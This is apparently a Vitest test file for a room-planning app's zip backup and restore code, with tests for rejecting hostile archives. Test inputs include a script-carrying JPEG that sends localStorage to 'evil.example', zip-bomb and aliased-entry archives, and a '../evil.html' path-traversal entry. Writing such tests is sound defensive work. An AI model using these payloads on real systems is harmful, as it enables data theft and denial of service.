import 'fake-indexeddb/auto';
import { deflateSync, strFromU8, strToU8, unzipSync, zipSync } from 'fflate';
import { beforeEach, describe, expect, it } from 'vitest';
import { sequentialIds } from '#lib/core/ids.ts';
import type { Project } from '#lib/core/schema.ts';
import { sha256Hex } from '#lib/features/photos/hash.ts';
import type { Reencode } from '#lib/features/photos/reencode.ts';
import { minimalJpeg, minimalWebp, svgImage } from '#lib/features/photos/testImages.ts';
import { db } from '#lib/state/db.ts';
import { getPhoto, loadProject, putPhoto, saveProject } from '#lib/state/persistence.ts';
import {
	BackupError,
	createBackup,
	createFullBackup,
	parseBackup,
	parseBackupSet,
	photoHashes,
	projectExists,
	restoreBackup,
	restoreBackupSet
} from './backup.ts';
import { furnishedProject, testPng } from './testing.ts';

const seen: string[] = [];

const reencode: Reencode = async (bytes, kind) => {
	seen.push(kind);
	const out = strToU8(`reencoded-${kind}-${bytes.length}`);
	const hash = await sha256Hex(out);
	const blob = new Blob([out as BlobPart], { type: 'image/png' });
	return { hash, blob, thumbnail: blob, w: 32, h: 24 };
};

async function seed(shade = 90) {
	const bytes = testPng(80, 60, shade);
	const hash = await sha256Hex(bytes);
	const project = furnishedProject(hash);
	await putPhoto({
		hash,
		blob: new Blob([bytes as BlobPart], { type: 'image/jpeg' }),
		thumbnail: new Blob([bytes as BlobPart], { type: 'image/jpeg' }),
		w: 64,
		h: 48,
		uploaded: false
	});
	await saveProject(project);
	return { project, hash, bytes };
}

async function archiveWithPhoto(bytes: Uint8Array, project: Project = furnishedProject()) {
	const hash = await sha256Hex(bytes);
	const withHash = furnishedProject(hash);
	withHash.id = project.id;
	return {
		hash,
		archive: zipSync({
			'project.json': strToU8(JSON.stringify(withHash)),
			[`photos/${hash}.jpg`]: bytes
		})
	};
}

async function blobBytes(blob: Blob): Promise<Uint8Array> {
	return new Uint8Array(await blob.arrayBuffer());
}

beforeEach(async () => {
	seen.length = 0;
	await Promise.all(db.tables.map((table) => table.clear()));
});

describe('backup roundtrip', () => {
	it('writes project.json, photos and extras into a zip', async () => {
		const { project, hash } = await seed();
		const result = await createBackup(project, {
			extras: [{ name: 'roomx-x.json', data: strToU8('{}'), compress: true }]
		});
		expect(result.photoCount).toBe(1);
		expect(result.missingPhotos).toBe(0);
		const parsed = await parseBackup(new Uint8Array(await result.blob.arrayBuffer()));
		expect(parsed.project).toEqual(project);
		expect([...parsed.photos.keys()]).toEqual([hash]);
	});

	it('restores into an empty database with a freshly encoded photo', async () => {
		const { project, hash } = await seed();
		const { blob } = await createBackup(project);
		await Promise.all(db.tables.map((table) => table.clear()));
		expect(await projectExists(project.id)).toBe(false);
		const parsed = await parseBackup(await blobBytes(blob));
		const restored = await restoreBackup(parsed, { mode: 'keep', reencode });
		expect(restored.missingPhotos).toBe(0);
		expect(restored.copied).toBe(false);
		expect(seen).toEqual(['png']);
		const loaded = await loadProject(project.id);
		expect(loaded?.name).toBe(project.name);
		const stored = loaded?.rooms[0].photos[0];
		expect(stored?.hash).not.toBe(hash);
		expect(stored).toMatchObject({ w: 32, h: 24 });
		const photo = await getPhoto(stored!.hash);
		expect(photo?.blob.type).toBe('image/jpeg');
		expect(photo?.thumbnail.type).toBe('image/jpeg');
		expect(strFromU8(await blobBytes(photo!.blob))).toMatch(/^reencoded-png-/);
		expect(await getPhoto(hash)).toBeUndefined();
		expect((await db.sync.get(project.id))?.dirty).toBe(true);
	});

	it('never overwrites a project with the same id but adds a copy', async () => {
		const { project } = await seed();
		const { blob } = await createBackup(project);
		await saveProject({ ...project, name: 'Geändert', rooms: [] });
		expect(await projectExists(project.id)).toBe(true);
		const parsed = await parseBackup(await blobBytes(blob));
		const restored = await restoreBackup(parsed, {
			mode: 'keep',
			copySuffix: 'Kopie',
			newId: sequentialIds('copy'),
			reencode
		});
		expect(restored.copied).toBe(true);
		expect(restored.project.id).toBe('copy-1');
		expect(restored.project.name).toBe('Wohnung Müller-Köhler (Kopie)');
		expect((await loadProject(project.id))?.name).toBe('Geändert');
		expect((await loadProject('copy-1'))?.rooms).toHaveLength(2);
	});

	it('treats the id of a deleted project as taken', async () => {
		const { project } = await seed();
		const { blob } = await createBackup(project);
		await db.projects.put({ ...project, deleted: true, rooms: [], variants: [] });
		const parsed = await parseBackup(await blobBytes(blob));
		const restored = await restoreBackup(parsed, { mode: 'keep', reencode });
		expect(restored.copied).toBe(true);
		expect(restored.project.id).not.toBe(project.id);
		expect((await db.projects.get(project.id))?.deleted).toBe(true);
	});

	it('creates a copy with a new id when asked and keeps the original', async () => {
		const { project } = await seed();
		const { blob } = await createBackup(project);
		const parsed = await parseBackup(await blobBytes(blob));
		const restored = await restoreBackup(parsed, {
			mode: 'copy',
			copySuffix: 'Kopie',
			newId: sequentialIds('copy'),
			reencode
		});
		expect(restored.project.id).toBe('copy-1');
		expect((await loadProject(project.id))?.name).toBe(project.name);
	});

	it('skips damaged photos and counts them', async () => {
		const { project, hash } = await seed();
		const archive = zipSync({
			'project.json': strToU8(JSON.stringify(project)),
			[`photos/${hash}.jpg`]: strToU8('not the original bytes')
		});
		const restored = await restoreBackup(await parseBackup(archive), { mode: 'copy', reencode });
		expect(restored.missingPhotos).toBe(1);
		expect(seen).toEqual([]);
		await db.photos.clear();
		const missing = await restoreBackup(
			await parseBackup(zipSync({ 'project.json': strToU8(JSON.stringify(project)) })),
			{ mode: 'copy', reencode }
		);
		expect(missing.missingPhotos).toBe(1);
		expect(await getPhoto(hash)).toBeUndefined();
	});

	it('counts photos missing from the local store when creating a backup', async () => {
		const { project } = await seed();
		await db.photos.clear();
		const result = await createBackup(project);
		expect(result.photoCount).toBe(0);
		expect(result.missingPhotos).toBe(1);
		expect(photoHashes(project)).toHaveLength(1);
	});
});

describe('image validation on restore', () => {
	async function restoreBytes(bytes: Uint8Array) {
		const { archive } = await archiveWithPhoto(bytes);
		const restored = await restoreBackup(await parseBackup(archive), { mode: 'copy', reencode });
		return { restored, photos: await db.photos.count() };
	}

	it('accepts JPEG, PNG and WebP and re-encodes each one', async () => {
		for (const bytes of [minimalJpeg(), testPng(), minimalWebp()]) {
			await db.photos.clear();
			const { restored, photos } = await restoreBytes(bytes);
			expect(restored.missingPhotos).toBe(0);
			expect(photos).toBe(1);
		}
		expect(seen).toEqual(['jpeg', 'png', 'webp']);
	});

	it('rejects an SVG even when it is named like a photo', async () => {
		const { restored, photos } = await restoreBytes(svgImage());
		expect(restored.rejectedPhotos).toBe(1);
		expect(restored.missingPhotos).toBe(1);
		expect(photos).toBe(0);
		expect(seen).toEqual([]);
	});

	it('rejects a JPEG that carries a script and stores nothing of it', async () => {
		const polyglot = minimalJpeg(64, 48, '<script>fetch("//evil.example/"+localStorage)</script>');
		const { restored, photos } = await restoreBytes(polyglot);
		expect(restored.rejectedPhotos).toBe(1);
		expect(photos).toBe(0);
		expect(seen).toEqual([]);
	});

	it('rejects a PNG with absurd dimensions before decoding it', async () => {
		const { restored } = await restoreBytes(minimalJpeg(40_000, 40_000));
		expect(restored.rejectedPhotos).toBe(1);
		expect(seen).toEqual([]);
	});

	it('treats an image that cannot be decoded as rejected', async () => {
		const { archive } = await archiveWithPhoto(testPng());
		const failing: Reencode = async () => {
			throw new Error('decode');
		};
		const restored = await restoreBackup(await parseBackup(archive), {
			mode: 'copy',
			reencode: failing
		});
		expect(restored.rejectedPhotos).toBe(1);
		expect(await db.photos.count()).toBe(0);
	});

	it('never keeps the original bytes of an imported image', async () => {
		const png = testPng(70, 50, 33);
		await restoreBytes(png);
		const [stored] = await db.photos.toArray();
		const original = await sha256Hex(png);
		expect(stored.hash).not.toBe(original);
		expect(stored.blob.type).toBe('image/jpeg');
		expect(strFromU8(await blobBytes(stored.blob))).toBe(`reencoded-png-${png.length}`);
	});
});

interface RawEntry {
	name: string;
	method: number;
	data: Uint8Array;
	declared: number;
}

function rawZip(
	entries: RawEntry[],
	aliases: { name: string; of: number; declared: number }[] = []
) {
	const parts: Uint8Array[] = [];
	const offsets: number[] = [];
	let offset = 0;
	const push = (bytes: Uint8Array) => {
		parts.push(bytes);
		offset += bytes.length;
	};
	for (const entry of entries) {
		const name = strToU8(entry.name);
		const header = new DataView(new ArrayBuffer(30));
		header.setUint32(0, 0x04034b50, true);
		header.setUint16(4, 20, true);
		header.setUint16(8, entry.method, true);
		header.setUint32(18, entry.data.length, true);
		header.setUint32(22, entry.declared, true);
		header.setUint16(26, name.length, true);
		offsets.push(offset);
		push(new Uint8Array(header.buffer));
		push(name);
		push(entry.data);
	}
	const directory = offset;
	const all = [
		...entries.map((entry, index) => ({ ...entry, of: index, size: entry.declared })),
		...aliases.map((alias) => ({
			...entries[alias.of],
			name: alias.name,
			of: alias.of,
			size: alias.declared
		}))
	];
	for (const entry of all) {
		const name = strToU8(entry.name);
		const record = new DataView(new ArrayBuffer(46));
		record.setUint32(0, 0x02014b50, true);
		record.setUint16(10, entry.method, true);
		record.setUint32(20, entry.data.length, true);
		record.setUint32(24, entry.size, true);
		record.setUint16(28, name.length, true);
		record.setUint32(42, offsets[entry.of], true);
		push(new Uint8Array(record.buffer));
		push(name);
	}
	const end = new DataView(new ArrayBuffer(22));
	end.setUint32(0, 0x06054b50, true);
	end.setUint16(8, all.length, true);
	end.setUint16(10, all.length, true);
	end.setUint32(12, offset - directory, true);
	end.setUint32(16, directory, true);
	push(new Uint8Array(end.buffer));
	const out = new Uint8Array(offset);
	let at = 0;
	for (const part of parts) {
		out.set(part, at);
		at += part.length;
	}
	return out;
}

describe('limits and errors', () => {
	const code = async (data: Uint8Array, limits = {}) => {
		try {
			await parseBackup(data, limits);
		} catch (error) {
			return error instanceof BackupError ? error.code : 'other';
		}
		return 'none';
	};

	it('rejects non-zip data', async () => {
		expect(await code(strToU8('hello'))).toBe('notZip');
	});

	it('rejects archives without project.json', async () => {
		expect(await code(zipSync({ 'readme.txt': strToU8('x') }))).toBe('noProject');
	});

	it('rejects broken or invalid project data', async () => {
		expect(await code(zipSync({ 'project.json': strToU8('{oops') }))).toBe('invalid');
		expect(await code(zipSync({ 'project.json': strToU8('{"id":"a"}') }))).toBe('invalid');
	});

	it('rejects projects from a newer schema', async () => {
		const { project } = await seed();
		const archive = zipSync({
			'project.json': strToU8(JSON.stringify({ ...project, schemaVersion: 99 }))
		});
		expect(await code(archive)).toBe('tooNew');
	});

	it('rejects a backup written by a newer format', async () => {
		const { project } = await seed();
		const archive = zipSync({
			'backup.json': strToU8(JSON.stringify({ format: 'roomx-backup', version: 9 })),
			'project.json': strToU8(JSON.stringify(project))
		});
		expect(await code(archive)).toBe('tooNew');
	});

	it('rejects files above the size limits with a clear code', async () => {
		const { project } = await seed();
		const json = strToU8(JSON.stringify(project));
		const archive = zipSync({ 'project.json': json });
		expect(await code(archive, { fileBytes: 50 })).toBe('tooLarge');
		expect(await code(archive, { jsonBytes: json.length - 1 })).toBe('tooLarge');
		expect(await code(archive, { unpackedBytes: json.length - 1 })).toBe('tooLarge');
		const photo = zipSync({
			'project.json': json,
			[`photos/${'a'.repeat(64)}.jpg`]: new Uint8Array(2000)
		});
		expect(await code(photo, { imageBytes: 1000 })).toBe('tooLarge');
	});

	it('does not inflate an entry that claims to be huge', async () => {
		const big = new Uint8Array(30 * 1024 * 1024);
		expect(await code(zipSync({ 'project.json': big }))).toBe('tooLarge');
	});

	it('stops inflating an entry whose header understates its size', async () => {
		const bomb = deflateSync(new Uint8Array(16 * 1024 * 1024).fill(0x20), { level: 9 });
		const archive = rawZip([{ name: 'project.json', method: 8, data: bomb, declared: 100 }]);
		const limits = { jsonBytes: 1024 * 1024, unpackedBytes: 2 * 1024 * 1024 };
		expect(await code(archive, limits)).toBe('tooLarge');
		expect(await code(archive, { unpackedBytes: 1024 * 1024 })).toBe('tooLarge');
	});

	it('rejects a stored entry whose real length differs from the declared one', async () => {
		const archive = rawZip([
			{ name: 'project.json', method: 0, data: strToU8('{"id":"a"}'), declared: 3 }
		]);
		expect(await code(archive)).toBe('invalid');
	});

	it('does not multiply data that several directory entries point to', async () => {
		const data = new Uint8Array(512 * 1024).fill(0x20);
		const aliases = Array.from({ length: 200 }, (_, index) => ({
			name: `photos/${String(index).padStart(64, '0')}.jpg`,
			of: 0,
			declared: data.length
		}));
		const archive = rawZip(
			[{ name: 'project.json', method: 0, data, declared: data.length }],
			aliases
		);
		const limits = { unpackedBytes: 2 * 1024 * 1024, jsonBytes: 1024 * 1024 };
		expect(await code(archive, limits)).toBe('invalid');
		const parsed = await parseBackupSet(
			zipSync({ 'projects/1.json': strToU8(JSON.stringify(furnishedProject())) })
		);
		expect(parsed.photos.size).toBe(0);
	});

	it('rejects truncated archives', async () => {
		const archive = zipSync({ 'project.json': strToU8(JSON.stringify(furnishedProject())) });
		expect(await code(archive.subarray(0, Math.floor(archive.length / 2)))).not.toBe('none');
	});

	it('rejects archives with too many entries, photos or projects', async () => {
		const { project } = await seed();
		const json = strToU8(JSON.stringify(project));
		const photos = Object.fromEntries(
			Array.from({ length: 4 }, (_, i) => [`photos/${String(i).repeat(64)}.jpg`, new Uint8Array(4)])
		);
		expect(await code(zipSync({ 'project.json': json, ...photos }), { photos: 3 })).toBe('tooMany');
		expect(await code(zipSync({ 'project.json': json, ...photos }), { entries: 3 })).toBe(
			'tooMany'
		);
		const set = zipSync({ 'projects/1.json': json, 'projects/2.json': json });
		await expect(parseBackupSet(set, { projects: 1 })).rejects.toThrowError(BackupError);
	});

	it('ignores everything that is not project data or a photo', async () => {
		const archive = zipSync({
			'project.json': strToU8('{"id":"a"}'),
			'../evil.html': strToU8('<script>1</script>'),
			'photos/x.svg': svgImage()
		});
		expect(await code(archive)).toBe('invalid');
	});
});

describe('backup of all projects', () => {
	async function seedMany() {
		const first = await seed(90);
		const second = furnishedProject(first.hash);
		second.id = 'second';
		second.name = 'Ferienhaus';
		const third = furnishedProject('b'.repeat(64));
		third.id = 'third';
		third.name = 'Büro';
		await saveProject(second);
		await saveProject(third);
		return [first.project, second, third];
	}

	it('stores every project once and shares photos between them', async () => {
		const projects = await seedMany();
		const result = await createFullBackup(projects);
		expect(result.projectCount).toBe(3);
		expect(result.photoCount).toBe(1);
		expect(result.missingPhotos).toBe(1);
		const set = await parseBackupSet(await blobBytes(result.blob));
		expect(set.projects.map((project) => project.id).sort()).toEqual(
			projects.map((project) => project.id).sort()
		);
		expect(set.photos.size).toBe(1);
		expect(set.skipped).toBe(0);
	});

	it('restores all projects with their photos into an empty database', async () => {
		const projects = await seedMany();
		const { blob } = await createFullBackup(projects);
		await Promise.all(db.tables.map((table) => table.clear()));
		const set = await parseBackupSet(await blobBytes(blob));
		const result = await restoreBackupSet(set, { reencode });
		expect(result).toMatchObject({ restored: 3, copies: 0, missingPhotos: 1, skipped: 0 });
		expect(seen).toEqual(['png']);
		for (const project of projects)
			expect((await loadProject(project.id))?.name).toBe(project.name);
		expect(await db.photos.count()).toBe(1);
		const shared = (await loadProject('second'))?.rooms[0].photos[0].hash;
		expect((await loadProject(projects[0].id))?.rooms[0].photos[0].hash).toBe(shared);
	});

	it('turns every project that already exists into a copy and changes nothing else', async () => {
		const projects = await seedMany();
		const { blob } = await createFullBackup(projects);
		const progress: number[] = [];
		const set = await parseBackupSet(await blobBytes(blob));
		const result = await restoreBackupSet(set, {
			reencode,
			copySuffix: 'Kopie',
			onProgress: (done) => progress.push(done)
		});
		expect(result).toMatchObject({ restored: 3, copies: 3 });
		expect(progress).toEqual([0, 1, 2, 3]);
		expect(await db.projects.count()).toBe(6);
		for (const project of projects)
			expect((await loadProject(project.id))?.name).toBe(project.name);
		const names = (await db.projects.toArray()).map((project) => project.name);
		expect(names.filter((name) => name.endsWith('(Kopie)'))).toHaveLength(3);
	});

	it('skips damaged projects but keeps the rest', async () => {
		const projects = await seedMany();
		const files = zipSync({
			'projects/1.json': strToU8(JSON.stringify(projects[0])),
			'projects/2.json': strToU8('{"broken":'),
			'projects/3.json': strToU8(JSON.stringify(projects[1]))
		});
		const set = await parseBackupSet(files);
		expect(set.projects).toHaveLength(2);
		expect(set.skipped).toBe(1);
		expect(set.skippedNames).toEqual(['projects/2.json']);
		const result = await restoreBackupSet(set, { reencode });
		expect(result).toMatchObject({ restored: 2, skipped: 1, skippedNames: ['projects/2.json'] });
	});

	it('keeps unreadable projects as raw entries and reports the ones that cannot load', async () => {
		const projects = await seedMany();
		const damaged = { name: 'Kaputt', rooms: 'nope' };
		const { blob, unreadableCount } = await createFullBackup([projects[0]], {
			unreadable: [
				{ id: 'a/b', name: 'Kaputt', raw: damaged },
				{ id: 'ok', name: 'Lesbar', raw: projects[1] },
				{ id: 'bad', name: 'Zyklus', raw: undefined }
			]
		});
		expect(unreadableCount).toBe(2);
		const bytes = await blobBytes(blob);
		const names = Object.keys(unzipSync(bytes)).filter((name) => name.startsWith('unreadable/'));
		expect(names.sort()).toEqual(['unreadable/a_b.json', 'unreadable/ok.json']);
		const set = await parseBackupSet(bytes);
		expect(set.projects).toHaveLength(2);
		expect(set.skippedNames).toEqual(['Kaputt']);
	});

	it('reads a backup of a single project as a set of one', async () => {
		const { project } = await seed();
		const { blob } = await createBackup(project);
		const set = await parseBackupSet(await blobBytes(blob));
		expect(set.projects.map((entry) => entry.id)).toEqual([project.id]);
	});

	it('has nothing to restore from a zip without projects', async () => {
		await expect(parseBackupSet(zipSync({ 'backup.json': strToU8('{}') }))).rejects.toThrowError(
			BackupError
		);
	});

	it('reads projects in numeric order', async () => {
		const projects = await seedMany();
		const entries: Record<string, Uint8Array> = {};
		for (let index = 12; index >= 1; index--) {
			entries[`projects/${index}.json`] = strToU8(
				JSON.stringify({ ...projects[0], id: `p${index}` })
			);
		}
		const set = await parseBackupSet(zipSync(entries));
		expect(set.projects.map((project) => project.id)).toEqual(
			Array.from({ length: 12 }, (_, i) => `p${i + 1}`)
		);
	});
});
